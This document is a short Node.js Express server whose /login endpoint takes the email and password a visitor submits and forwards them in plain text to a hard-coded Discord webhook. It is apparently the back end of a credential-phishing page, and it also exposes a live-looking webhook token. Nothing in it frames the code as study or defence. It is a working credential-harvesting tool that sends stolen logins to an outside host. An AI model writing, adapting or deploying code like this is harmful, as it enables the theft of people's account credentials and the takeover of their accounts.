const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const port = 3000;

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse JSON body
app.use(bodyParser.json());

// Endpoint to handle the login form data
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    // Construct the payload for Discord webhook
    const data = {
        content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`
    };

    try {
        // Send the data to Discord webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1306666512056320080/cf8gXnjmqwlDCs8Yb5av5B3-TlZK_st4pvzU-1e3ltvRQbA-2laOy_vdEbuErFhR4_WL'; // Replace this with your Discord webhook URL
        await axios.post(webhookUrl, data);
        res.status(200).send({ success: true, message: 'Data sent to Discord!' });
    } catch (error) {
        console.error('Error sending to Discord:', error);
        res.status(500).send({ success: false, message: 'Error sending data to Discord' });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
